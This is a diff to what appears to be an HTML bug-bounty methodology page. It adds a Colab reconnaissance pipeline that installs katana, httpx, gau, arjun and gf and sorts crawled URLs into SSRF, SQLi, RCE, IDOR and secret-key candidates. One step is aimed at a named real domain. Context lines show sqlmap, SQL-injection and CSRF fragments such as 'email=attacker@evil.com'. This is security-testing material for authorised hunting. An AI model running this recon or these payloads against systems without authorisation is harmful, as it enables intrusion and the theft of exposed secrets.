                 height="24"
@@ -7071,7 +7310,7 @@ python3 corsy.py -i live_subs.txt -t 10 \
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -7142,7 +7381,7 @@ python3 corsy.py -i live_subs.txt -t 10 \
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -7207,7 +7446,7 @@ sqlmap -u "https://TARGET/page.php?id=1" \
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -7309,7 +7548,7 @@ sqlmap -u "https://TARGET/page.php?id=1" \
               <div class="st"><span class="sd"></span>Report Template</div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -7398,7 +7637,7 @@ Which users are affected? What data is exposed?
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -7452,12 +7691,630 @@ Which users are affected? What data is exposed?
           </div>
         </div>
 
+        <!-- PHASE 19 PYTHON TOOLS(GOOLGE - COLLAB) -->
+        <div class="pp" id="pp19">
+          <div class="ph">
+            <div class="pi">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 24 24"
+              width="24"
+              height="24"
+              fill="none"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              style="cursor: pointer"
+              onclick="this.classList.toggle('generating'); setTimeout(() => this.classList.remove('generating'), 3000)"
+            >
+              <style>
+                .script-shell {
+                  transition: transform 0.2s ease, stroke 0.2s ease;
+                }
+                .script-lines {
+                  transition: stroke 0.2s ease, opacity 0.2s ease;
+                }
+                .ph:hover .script-shell {
+                  transform: translateY(-1px);
+                  stroke: #2563eb;
+                }
+                .ph:hover .script-lines {
+                  stroke: #2563eb;
+                  opacity: 0.8;
+                }
+                svg.generating .script-shell {
+                  stroke: #10b981 !important;
+                  transform: scale(0.95);
+                }
+                svg.generating .script-lines {
+                  stroke: #10b981 !important;
+                  animation: blink-lines 0.8s steps(1) infinite;
+                }
+                @keyframes blink-lines {
+                  0%, 100% { opacity: 1; }
+                  50% { opacity: 0.2; }
+                }
+              </style>
+
+              <!-- Terminal frame -->
+              <rect
+                class="script-shell"
+                x="3" y="3" width="18" height="18" rx="2"
+                stroke="#3b82f6" stroke-width="2"
+              />
+
+              <!-- Caret prompt -->
+              <path
+                class="script-shell"
+                d="M6 7l2.5 2.5L6 12"
+                stroke="#3b82f6" stroke-width="1.5"
+              />
+
+              <!-- Code lines -->
+              <line class="script-lines" x1="11" y1="8" x2="17" y2="8" stroke="#3b82f6" stroke-width="1.5"/>
+              <line class="script-lines" x1="11" y1="12" x2="15" y2="12" stroke="#3b82f6" stroke-width="1.5"/>
+              <line class="script-lines" x1="6" y1="16" x2="17" y2="16" stroke="#3b82f6" stroke-width="1.5"/>
+            </svg>
+            </div>
+            <div class="pm">
+              <h2>Environment Setup & Tool Installation</h2>
+              <p>
+                Mount Drive, install Go, katana, httpx, uro. Verify all binaries are reachable before proceeding.
+              </p>
+              <span class="ptag ta">Automated</span
+              ><span class="ptag tr">Setup</span>
+            </div>
+          </div>
+          <button
+            tooltip="Expand All"
+            class="collapse-all-btn"
+            data-collapse-target="pp19"
+            data-state="collapsed"
+          >
+            <svg
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="chevron-icon"
+            >
+              <!-- Double Chevron / Multi-Expand Geometry Layout -->
+              <polyline class="chevron-top" points="4 6 12 14 20 6" />
+              <polyline class="chevron-bottom" points="4 10 12 18 20 10" />
+            </svg>
+          </button>
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Environment Setup</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">python</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Mount Drive
+from google.colab import drive
+drive.mount('/content/drive')
+import subprocess, os
+WORKDIR = '/content/drive/MyDrive/katana_runs'
+os.makedirs(WORKDIR, exist_ok=True)
+os.makedirs(f"{WORKDIR}/responses", exist_ok=True)
+print(f"Working directory: {WORKDIR}")
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Install Go</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">python</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Install Go
+result = subprocess.run(
+    ['curl', '-s', 'https://go.dev/VERSION?m=text'],
+    capture_output=True, text=True
+)
+GO_VERSION = result.stdout.strip().splitlines()[0]
+print(f"Latest stable Go: {GO_VERSION}")
+os.system(f"wget -q https://go.dev/dl/{GO_VERSION}.linux-amd64.tar.gz")
+os.system("rm -rf /usr/local/go")
+os.system(f"tar -C /usr/local -xzf {GO_VERSION}.linux-amd64.tar.gz")
+os.environ['GOROOT'] = '/usr/local/go'
+os.environ['GOPATH'] = '/root/go'
+os.environ['PATH']   = (
+    '/usr/local/go/bin'
+    + ':/root/go/bin'
+    + ':' + os.environ['PATH']
+)
+os.system("go version")
+
+%env WORKDIR=/content/drive/MyDrive/katana_runs
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Install katana, httpx, uro</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">python</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Install katana + uro (uro cleans the output — non-negotiable
+os.system("go install github.com/projectdiscovery/katana/cmd/katana@latest")
+os.system("go install github.com/projectdiscovery/httpx/cmd/httpx@latest")
+os.system("pip install -q uro")
+# Verify all three are reachable
+os.system("katana -version")
+os.system("~/go/bin/httpx -version")
+os.system("uro --version")
+
+!free -h          # check RAM headroom before deciding on -jsl
+!~/go/bin/katana -health-check
+# Spot-check that you're not crawling Cloudflare challenge pages from
+# a flagged cloud IP — run this against ONE known-live URL first.
+!~/go/bin/katana -u https://TARGET -d 1 -silent | head -5
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Domain Extraction</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">python</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Extract domains from live_subs.txt -> domains.txt
+from urllib.parse import urlparse
+INPUT   = f"live_subs.txt"
+OUTPUT  = f"{WORKDIR}/domains.txt"
+
+domains = set()
+
+with open(INPUT, 'r') as f:
+    for line in f:
+        line = line.strip()
+        if not line:
+            continue
+
+        # Handle lines that already are bare hostnames (no scheme)
+        if not line.startswith('http://') and not line.startswith('https://'):
+            line = 'https://' + line
+
+        try:
+            host = urlparse(line).hostname
+            if host:
+                domains.add(host.lower())
+        except Exception:
+            continue
+
+with open(OUTPUT, 'w') as f:
+    for d in sorted(domains):
+        f.write(d + '\n')
+
+print(f"Unique domains extracted : {len(domains)}")
+print(f"Saved to                 : {OUTPUT}")
+print("\nSample (first 20):")
+for d in sorted(domains)[:20]:
+    print(f"  {d}")
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Passive URL Collection</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Passive URL collection (zero requests to target)
+#   Run this BEFORE active crawling. Wayback + gau surface
+#   endpoints that katana will never find in a single crawl.
+#   Install waybackurls and gau
+os.system("go install github.com/tomnomnom/waybackurls@latest")
+os.system("go install github.com/lc/gau/v2/cmd/gau@latest")
+
+# Create default gau config and re-run
+GAU_CONFIG = "/root/.gau.toml"
+
+config_content = """
+[providers]
+  wayback   = true
+  commoncrawl = true
+  otx       = true
+  urlscan   = true
+
+[filters]
+  blacklist = ["png","jpg","jpeg","gif","svg","ico","woff","woff2","ttf","eot","mp4","webm","css"]
+
+[workers]
+  workers = 1
+"""
+with open(GAU_CONFIG, 'w') as f:
+    f.write(config_content.strip())
+print(f"Config written to: {GAU_CONFIG}")
+os.system(f"cat {GAU_CONFIG}")
+
+# Feed domains only (no scheme), one per line
+# Assumes you have a domains.txt extracted from live_subs.txt
+!cat "$WORKDIR/domains.txt" | ~/go/bin/waybackurls > "$WORKDIR/passive_wayback.txt"
+!cat "$WORKDIR/domains.txt" | ~/go/bin/gau --subs > "$WORKDIR/passive_gau.txt"
+
+# Merge and deduplicate passive results immediately
+!cat "$WORKDIR/passive_wayback.txt" "$WORKDIR/passive_gau.txt" \
+  | uro -o "$WORKDIR/passive_filtered.txt"
+
+print("Passive URLs after dedup:", end=" ")
+!wc -l "$WORKDIR/passive_filtered.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Active Crawl — katana</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Active crawl with katana
+#   Flag rationale:
+#   -jc          parse and execute JavaScript (finds API calls,
+#                dynamic routes)
+#   -kf all      include known-file paths from katana's wordlist
+#   -xhr         capture XHR/fetch requests made by JS
+#   -fx          extract endpoints from JS source files directly
+#   -d 5         crawl depth; reduce to 3 if crawl runs >90 min
+#   -c 5         concurrency; conservative for shared cloud IP
+#   -rl 10       rate limit requests/sec; check program scope
+#                rules before increasing
+#   -ef          skip static assets that add noise and cost time
+#   -jsonl       structured output — lets you extract fields
+#                with jq later without re-crawling
+#   -silent      suppress progress noise to stdout
+#
+#   NOT used here:
+#   -jsl         headless JS (uses full browser); only add if
+#                `free -h` above shows >4 GB free AND you need
+#                it for a specific SPA target
+#   -sr/-srd     raw response saving; useful for spot checks
+#                but will exhaust Drive quota on large crawls.
+#                Use selectively on a subset if needed.
+
+!~/go/bin/katana \
+  -list live_subs.txt \
+  -jc -kf all -xhr -fx \
+  -d 5 \
+  -c 5 \
+  -rl 10 \
+  -ef "woff,css,png,jpg,woff2,jpeg,gif,svg,ico,mp4,webm,ttf,eot" \
+  -o "$WORKDIR/endpoints_raw.txt" \
+  -jsonl \
+  -silent > /dev/null 2>&1
+
+print("Raw endpoints collected:", end=" ")
+!wc -l "$WORKDIR/endpoints_raw.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Parse & Deduplicate Output</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Parse and clean active crawl output
+#   The -jsonl flag means each line is a JSON object.
+#   katana's JSONL schema uses the key "endpoint" for the URL.
+#   jq extracts it; uro deduplicates and normalizes.
+
+# Extract URLs from JSONL — handles both schema variants
+!cat "$WORKDIR/endpoints_raw.txt" \
+  | jq -r '.endpoint // .request.endpoint // .url // empty' 2>/dev/null \
+  > "$WORKDIR/urls_only.txt"
+
+# Merge with passive results before dedup pass
+!cat "$WORKDIR/urls_only.txt" "$WORKDIR/passive_filtered.txt" \
+  > "$WORKDIR/urls_combined.txt"
+
+# Deduplicate and normalize with uro
+!uro -i "$WORKDIR/urls_combined.txt" -o "$WORKDIR/filtered.txt"
+
+print("Active raw:   ", end="")
+!wc -l "$WORKDIR/urls_only.txt"
+print("Combined:     ", end="")
+!wc -l "$WORKDIR/urls_combined.txt"
+print("After uro:    ", end="")
+!wc -l "$WORKDIR/filtered.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Live Probe — httpx</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Live probe with httpx
+#   -sc   show status code
+#   -cl   show content length (helps spot uniform blocked resp)
+#   -title  extract page title
+#   -mc   only show these status codes — reduces noise
+#   -td   show response content type
+#   -silent suppress banners
+#
+#   Output saved to Drive for later grep/analysis.
+#   Do NOT redirect to /dev/null — you need this output.
+
+!cat "$WORKDIR/filtered.txt" \
+  | ~/go/bin/httpx \
+    -sc \
+    -cl \
+    -title \
+    -td \
+    -mc 200,301,302,403,401,405,500 \
+    -silent \
+  | tee "$WORKDIR/live_endpoints.txt" \
+  | head -50 > /dev/null 2>&1
+
+print("\nTotal live endpoints:", end=" ")
+!wc -l "$WORKDIR/live_endpoints.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>JS Endpoint Extraction</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# JavaScript endpoint extraction (separate pass)
+#   katana -fx covers basic JS parsing but misses obfuscated
+#   or lazy-loaded scripts. getJS + LinkFinder covers this gap.
+#   This is where auth tokens, hidden API routes, and internal
+#   service URLs appear — high value for IDOR and auth bugs.
+os.system("pip install -q xnLinkFinder")
+os.system("go install github.com/003random/getJS@latest")
+
+# Pull all JS file URLs from your filtered list
+!grep -iE '\.js(\?|$)' "$WORKDIR/filtered.txt" > "$WORKDIR/js_files.txt"
+
+print("JS files found:", end=" ")
+!wc -l "$WORKDIR/js_files.txt"
+
+# Fetch each JS file and extract endpoints from source
+# !cat "$WORKDIR/js_files.txt" | ~/go/bin/getJS --complete > "$WORKDIR/js_resolved.txt"
+# !wc -l "$WORKDIR/js_resolved.txt"
+# !head -10 "$WORKDIR/js_resolved.txt"
+
+# scoped, secrets output, parameters captured
+!cat "$WORKDIR/js_files.txt" \
+  | ~/go/bin/getJS --complete \
+  | xnLinkFinder \
+      -o cli \
+      -sp https://acko.com \
+      -sf acko.* \
+      -os "$WORKDIR/js_secrets.txt" \
+      -op "$WORKDIR/js_params.txt" \
+      -s429 -s403 \
+  | uro \
+  | tee "$WORKDIR/js_endpoints.txt" \
+  | head -30
+print("\nEndpoints from JS:", end=" ")
+!wc -l "$WORKDIR/js_endpoints.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Parameter Discovery — arjun</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Parameter discovery
+#   Run arjun against filtered endpoints to find hidden params.
+#   Hidden parameters are the primary attack surface for IDOR,
+#   mass assignment, and auth bypass bugs.
+#   -t 10  threads; keep low to avoid rate limiting
+#   -oJ    JSON output for structured triage
+os.system("pip install -q arjun")
+
+!python3 -m arjun \
+  -i "$WORKDIR/filtered.txt" \
+  -t 10 \
+  -oJ "$WORKDIR/arjun_params.json" \
+  2>/dev/null
+
+print("Arjun output saved to $WORKDIR/arjun_params.json")
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>GF installation with patterns</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# GF installation with patterns
+os.system("go install github.com/tomnomnom/gf@latest")
+
+# Install patterns — THIS is what hunters actually do.
+#    tomnomnom's original patterns + 1ndianl33t's extended set
+#    (covers SSRF, IDOR, JWT, debug params, etc.)
+os.system("git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gf-patterns")
+os.system("mkdir -p ~/.gf")
+os.system("cp /tmp/gf-patterns/*.json ~/.gf/")
+
+# Also grab tomnomnom's originals (some overlap, union is better)
+os.system("git clone --depth 1 https://github.com/tomnomnom/gf /tmp/gf-src")
+os.system("cp /tmp/gf-src/examples/*.json ~/.gf/ 2>/dev/null || true")
+
+# Verify patterns loaded
+print("GF patterns installed:")
+os.system("ls ~/.gf/ | sed 's/.json//' | column")
+
+# ============================================================
+# Build the master URL list for gf to scan
+#   Top hunters run gf over EVERYTHING: active + passive + JS
+#   Not just js_endpoints.txt — that's the common mistake.
+
+!cat \
+  "$WORKDIR/filtered.txt" \
+  "$WORKDIR/passive_filtered.txt" \
+  "$WORKDIR/js_endpoints.txt" \
+  "$WORKDIR/js_params.txt" \
+  2>/dev/null \
+  | sort -u \
+  > "$WORKDIR/gf_input.txt"
+
+print("Total URLs feeding into gf:")
+!wc -l "$WORKDIR/gf_input.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>GF pattern matching wordlist</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# GF pattern matching — full hunter wordlist
+#   Running each pattern separately lets you triage by severity
+#   rather than drowning in a single merged file.
+
+GF_PATTERNS = {
+    # Critical / High
+    "ssrf":         "ssrf_candidates.txt",
+    "idor":         "idor_candidates.txt",
+    "sqli":         "sqli_candidates.txt",
+    "rce":          "rce_candidates.txt",
+    "ssti":         "ssti_candidates.txt",
+    "lfi":          "lfi_candidates.txt",
+    # Medium
+    "xss":          "xss_candidates.txt",
+    "redirect":     "redirect_candidates.txt",
+    "xxe":          "xxe_candidates.txt",
+    "cors":         "cors_candidates.txt",
+    # Recon / Misc
+    "debug_logic":  "debug_candidates.txt",
+    "upload-fields":"upload_candidates.txt",
+    "img-traversal":"img_traversal_candidates.txt",
+    "s3-buckets":   "s3_candidates.txt",
+    "aws-keys":     "aws_key_candidates.txt",
+    "firebase":     "firebase_candidates.txt",
+    "php-errors":   "php_error_candidates.txt",
+}
+
+results_summary = []
+
+for pattern, outfile in GF_PATTERNS.items():
+    outpath = f"{WORKDIR}/{outfile}"
+    # Run gf; if pattern doesn't exist it'll print an error — we suppress those
+    ret = os.system(
+        f"cat '{WORKDIR}/gf_input.txt' | ~/go/bin/gf {pattern} "
+        f"> '{outpath}' 2>/dev/null"
+    )
+    count_result = os.popen(f"wc -l < '{outpath}' 2>/dev/null").read().strip()
+    count = int(count_result) if count_result.isdigit() else 0
+    if count > 0:
+        results_summary.append((pattern, count, outpath))
+
+# ============================================================
+# Summary table — what actually has hits
+print("\n" + "="*55)
+print(f"{'PATTERN':<20} {'HITS':>6}  {'OUTPUT FILE'}")
+print("="*55)
+for pattern, count, path in sorted(results_summary, key=lambda x: -x[1]):
+    fname = os.path.basename(path)
+    flag  = " ◄ HIGH PRIORITY" if pattern in ("ssrf","sqli","rce","ssti","idor","lfi") else ""
+    print(f"{pattern:<20} {count:>6}  {fname}{flag}")
+print("="*55)
+print(f"\nAll outputs saved to: {WORKDIR}/")
+
+# ============================================================
+# Quick triage: show top 10 from each high-priority pattern
+HIGH_PRIORITY = ["ssrf", "sqli", "rce", "ssti", "idor", "lfi"]
+
+for pattern, count, path in results_summary:
+    if pattern in HIGH_PRIORITY and count > 0:
+        print(f"\n{'='*55}")
+        print(f"  TOP 10 — {pattern.upper()} ({count} total)")
+        print(f"{'='*55}")
+        os.system(f"head -10 '{path}'")
+</pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
         <!-- PHASE 15 FILE GENERATOR -->
         <div class="pp" id="pp15">
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -7650,7 +8507,7 @@ Which users are affected? What data is exposed?
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -7802,7 +8659,7 @@ Which users are affected? What data is exposed?
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -8086,7 +8943,7 @@ admin'/*
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -8418,7 +9275,7 @@ function handleResponse(){
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -8566,7 +9423,7 @@ GET /change?_method=POST&amp;email=attacker@evil.com
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -8662,7 +9519,7 @@ curl -I https://TARGET/ | grep -i "x-frame\|frame-ancestors"
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -8797,7 +9654,7 @@ grep -rE "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
